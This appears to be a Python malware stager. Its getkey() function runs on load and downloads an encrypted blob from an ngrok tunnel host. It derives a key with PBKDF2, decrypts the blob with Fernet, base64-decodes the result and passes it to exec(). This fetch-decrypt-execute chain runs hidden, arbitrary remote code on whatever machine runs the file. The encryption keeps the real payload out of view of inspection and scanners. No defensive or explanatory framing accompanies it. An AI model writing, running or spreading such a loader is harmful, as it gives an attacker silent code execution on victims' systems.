import base64
import secrets
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import http.client

KDF_ALGORITHM = hashes.SHA256()
KDF_LENGTH = 32
KDF_ITERATIONS = 120000


def decrypt(ciphertext: bytes, password: str, salt: bytes) -> str:
    # Derive the symmetric key using the password and provided salt.
    kdf = PBKDF2HMAC(
        algorithm=KDF_ALGORITHM, length=KDF_LENGTH, salt=salt,
        iterations=KDF_ITERATIONS)
    key = kdf.derive(password)

    # Decrypt the message
    f = Fernet(base64.urlsafe_b64encode(key))
    plaintext = f.decrypt(ciphertext)

    return plaintext.decode("utf-8")
def getkey():
    #gets the payload from http server
    conn = http.client.HTTPConnection("0.tcp.ap.ngrok.io", 12530)
    params = '/'
    conn.request("GET", params)
    key = conn.getresponse().read().decode()
    global stuff
    stuff = [base64.b64decode(i) for i in key.split()]
    payload = decrypt(stuff[1], stuff[0], stuff[2])
    exec(base64.b64decode(payload))
getkey()
